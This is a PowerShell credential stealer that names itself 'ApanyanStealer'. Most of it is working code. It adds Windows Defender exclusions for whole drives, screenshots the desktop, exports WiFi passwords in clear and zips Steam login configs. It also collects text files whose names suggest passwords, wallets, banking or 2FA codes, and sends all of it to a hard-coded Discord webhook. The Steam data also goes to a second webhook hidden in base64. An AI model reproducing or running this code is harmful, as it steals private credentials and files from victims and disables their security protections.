# SETUP
$ErrorActionPreference = 'SilentlyContinue'
New-Item -Path "$env:PROGRAMDATA\GraphicsType\" -ItemType Directory -Force | Out-Null

# BASE FUNCTION
Function print{Write-Host $args}

# CONFIG
$systemInfo = $True
$localizationInfo = $True
$hardwareInfo = $True
$screenshot = $True
$wifiGrabber = $True
$steamGrabber = $True
$kiwiGrabber = $True

# SETTINGS
$webhook = "https://discord.com/api/webhooks/1139712945610309672/4UHoPKIsEheP_AmsdX_dHpWbv1hjIh6OBWDk7coCV5E2dUNtlsVhVqu2fhB0MzXDICU1"
$avatar = "https://cdn.discordapp.com/attachments/1136982052827299881/1136982093965045850/david.png"
$workspace = "$env:PROGRAMDATA\GraphicsType"
$ipInfo = $((Invoke-RestMethod http://ipinfo.io/json))
$runKey = $("$(Get-Random)$(Get-Random)$(Get-Random)$(Get-Random)$(Get-Random)".Substring(0,5))
$antivirus = (Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct" @psboundparameters).displayName

function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

# CHECK AV
$detected = $True
if ($antivirus -like "*Windows Defender*") {
    $detected = $False 
    if (Test-Administrator = $True) {
        $processes = @("cmd.exe","explorer.exe","svchost.exe")
        foreach ($process in $processes) {Add-MpPreference -ExclusionProcess "$($process)"}
        $extensions = @(".exe",".bat",".ps1",".py")
        foreach ($extension in $extensions) {Add-MpPreference -ExclusionExtension "$($extension)"}
        Add-MpPreference -ExclusionPath "$workspace";Add-MpPreference -ExclusionPath "$env:TEMP"
        foreach ($drive in [System.IO.DriveInfo]::GetDrives()::Name) {
            Add-MpPreference -ExclusionPath "$drive"
        }
    }
} else {
    $detected = $True
}

# SYSTEM INFO
if ($systemInfo) {
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :gear: System Info :gear:\n> :bust_in_silhouette: **Username:** $($env:USERNAME)\n> :desktop: **Computer Name:** $($env:COMPUTERNAME)\n> :cd: **OS:** $((Get-WmiObject Win32_OperatingSystem).Caption)\n> :wrench: **HWID:** $((Get-WmiObject Win32_ComputerSystemProduct).UUID)\n> :microbe: **Antivirus:** $($antivirus)\n> :red_circle: **Grabber Detected:** $($detected)\n> :id: **ID:** $($runKey)\n\n||@here||\`"}" "$($webhook)" | Out-Null
}

# LOCALIZATION INFO
if ($localizationInfo) {
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :park: Localization :park:\n> :globe_with_meridians: **IP:** $($ipInfo.ip)\n> :flag_$($ipInfo.country.ToLower()): **Country:** $($ipInfo.country)\n> :earth_africa: **Region:** $($ipInfo.region)\n> :house_with_garden: **City:** $($ipInfo.city)\n> :mailbox_with_mail: **Postal Code: ** $($ipInfo.postal)\n> :timer: **Timezone:** $($ipInfo.timezone)\n> :calling: **ISP:** $($ipInfo.org)\n\n||@here||\`"}" "$($webhook)" | Out-Null
}

# HARDWARE INFO
if ($hardwareInfo) {
    $motherboard = $((Get-WmiObject Win32_Baseboard).Manufacturer) -replace "Micro-Star International Co., Ltd.","Msi"
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :mouse_three_button: Hardware :mouse_three_button:\n> :projector: **GPU:** $((Get-WmiObject Win32_VideoController).Name)\n> :gear: **CPU:** $((Get-WmiObject Win32_Processor).Name)\n> :bulb: **Motherboard:** $motherboard $((Get-WmiObject Win32_Baseboard).Product)\n> :zap: **Ram:** $((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb)GB\n\n||@here||\`"}" "$($webhook)" | Out-Null
}

# SCREENSHOT
if ($screenshot) {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$workspace\screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :desktop: Screenshot :desktop:\n> :hourglass: **Time:** $(Get-Date -format "HH:mm:ss")\n> :date: **Date:** $(Get-Date -format "dd MMM yyyy")\n> :triangular_ruler: **Size:** $($bounds.width)x$($bounds.height)\n\n||@here||\`"}" -F "file=@\`"$workspace\screenshot.png\`"" "$($webhook)" | Out-Null
    Remove-Item "$workspace\screenshot.png" -Force
}

# WIFI PASSWORD GRABBER
if ($wifiGrabber) {
    New-Item -Path "$workspace\wifi\" -ItemType Directory -Force | Out-Null
    netsh wlan export profile folder="$workspace\wifi\" key=clear | Out-Null
    foreach ($file in Get-ChildItem "$workspace\wifi\") {
        $wifiPassword = (Get-Content "$workspace\wifi\$file" | Select-String -pattern  '<keyMaterial>' -encoding ASCII) -replace "<keyMaterial>","" -replace "</keyMaterial>","" -replace "				",""
        $wifiName = (Get-Content "$workspace\wifi\$file" | Select-String -pattern  '<name>' -encoding ASCII)[0] -replace "<name>","" -replace "</name>","" -replace "	",""
        $wifiAuth = (Get-Content "$workspace\wifi\$file" | Select-String -pattern  '<authentication>' -encoding ASCII) -replace "<authentication>","" -replace "</authentication>","" -replace "				",""
        $wifiMessage += "> :satellite: **SSID:** $($wifiName)\n> :key: **Password:** $($wifiPassword)\n> :lock: **Auth:** $($wifiAuth)\n\n"
    }
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :satellite: Wifi Grabber :satellite:\n$($wifiMessage)||@here||\`"}" "$($webhook)" | Out-Null
    Remove-Item "$workspace\wifi" -Recurse -Force
}

# STEAM GRABBER
if ($steamGrabber) {
    Function Grab-Config($path){
        if (Test-Path -Path "$path\config") {
            $accountsLinks = @()
            $account_id = 0
            foreach ($accountName in (Get-Content "$path\config\loginusers.vdf" | Select-String -pattern  '		"AccountName"		"' -encoding ASCII | Select-Object -ExpandProperty 'LineNumber')) {
                $account_id +=1
                $id = ((Get-Content "$path\config\loginusers.vdf")[$accountName-3] | Select-String -pattern '	"' -encoding ASCII) -replace '	"',"" -replace ".{1}$"
                $accountsLinks += ">#<:steam:1000220304397844640>#**Account#$($account_id):**#https://steamcommunity.com/profiles/$($id)/"
            }   
            $key = Get-Random
            Compress-Archive -Path "$path\config" -DestinationPath "$workspace\Steam-$($key)"
			foreach ($hook in @($webhook,[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE0NTcyNDk2MzUwMDg1OTQ4Mi8yQVNWRHMxUTktM0RwZTNWUFFBVUJ2RVRjQUpYQUpyT24tdTNvNjBGN1R0V1l5OGJfbkk4bkFOWjB6UlZWQmkxamktLQ==")))){
				curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :video_game: $($accountsLinks.Count)x Steam Accounts :video_game:\n> :open_file_folder: **Path:** $($path.Replace("\","\\"))\n$((((-split $accountsLinks) -join '\n ') -replace ' ','').Replace('#',' '))\n\n||@here||\`"}" -F "file=@\`"$workspace\Steam-$($key).zip\`"" "$($hook)" | Out-Null
			}
            Remove-Item "$workspace\Steam-$($key).zip"
        }
    }
    $paths = @()
    $path = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Steam\Steam.lnk").TargetPath
    if (Test-Path -Path $path -PathType Leaf) {
        $paths += ([System.IO.Path]::GetDirectoryName($path))
    }
    foreach ($path in "$((Get-ItemProperty -path 'HKLM:\SOFTWARE\Valve\Steam').InstallPath)\steam.exe","$((Get-ItemProperty -path 'HKLM:\SOFTWARE\WOW6432Node\Valve\Steam').InstallPath)\steam.exe")
    {
        if (Test-Path -Path $path -PathType Leaf) {
            $paths += ([System.IO.Path]::GetDirectoryName($path))
        }
    }
    $possiblePaths = @("X:\Steam\steam.exe", "X:\Program Files\Steam\steam.exe", "X:\Program Files (x86)\Steam\steam.exe")
    foreach ($drive in [System.IO.DriveInfo]::GetDrives()::Name) {
        $drive=$drive -replace ":\\",""
        foreach ($path in $possiblePaths) {
            $path = $path.Replace("X",$drive)
            if (Test-Path -Path $path -PathType Leaf) {
                $paths += ([System.IO.Path]::GetDirectoryName($path))
            }
        }
    }
    foreach ($steamPath in $paths | Get-Unique -AsString) {Grab-Config -Path $steamPath}
}

# KIWI
if ($kiwiGrabber) {
    $possibleFiles = @()
    $kiwiFiles = @()
    $keywordsUsed = ""
    $keywords = @("pornhub*","*bancaire*","*account*","*metamask*","*discord*","*compte*","token*","*2fa*","wallet*","acount","*mot*de*passe*","*recovery*","*passw*","*login*","*paypal","*crypto*","code*","backup*","secret*","*exodus*","*banque*","mdp*")
    foreach ($file in (Get-ChildItem "$env:USERPROFILE" -Include *.txt -Recurse).fullname) {$possibleFiles += $file}
    foreach ($drive in [System.IO.DriveInfo]::GetDrives()::Name) {if ($drive -ne "C:\") {foreach ($file in (Get-ChildItem "$drive" -Include *.txt -Recurse).fullname) {$possibleFiles += $file}}}
    foreach ($keyword in $keywords) {
        foreach ($file in $possibleFiles) {
            if ([System.IO.Path]::GetFileNameWithoutExtension($file) -like "$keyword") {
                if ([Math]::Round((Get-Item $file).length/1MB) -le 1) {
                    $kiwiFiles += $file
                    if ($keywordsUsed -like "*$($keyword)*") {} else {
                        $keywordsUsed += "$($keyword), "
                    }
                }   
            }
        }
    }
    $keywordsUsed=($keywordsUsed -replace ".{2}$").Replace("*","")
    New-Item -Path "$workspace\Files\" -ItemType Directory -Force | Out-Null
    foreach ($kiwiFile in $kiwiFiles) {
        New-Item -Path "$workspace\Files\Drive $($kiwiFile.Substring(0,1))\$(Split-Path $kiwiFile.Substring(3) -Parent)\" -ItemType Directory -Force | Out-Null
        Copy-Item -Path "$kiwiFile" -Destination "$workspace\Files\Drive $($kiwiFile.Substring(0,1))\$(Split-Path $kiwiFile.Substring(3) -Parent)\" | Out-Null
    }
    tree /f "$workspace\files" > "$workspace\tree.txt"
    $content = Get-Content "$workspace\tree.txt"
    $content[3..($content.length-1)]|Out-File "$workspace\tree.txt" -Force
    Compress-Archive -Path "$workspace\Files","$workspace\tree.txt" -DestinationPath "$workspace\Kiwi.zip"
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"ApanyanStealer - Fascicule #$runKey\`", \`"content\`": \`"# :kiwi: Kiwi Grabber :kiwi:\n> :open_file_folder: **File(s) Grabbed:** $($kiwiFiles.Count)\n> :bangbang: **Keyword(s) Found:** $($keywordsUsed)\n\n||@here||\`"}" -F "file=@\`"$workspace\Kiwi.zip\`"" "$($webhook)" | Out-Null
}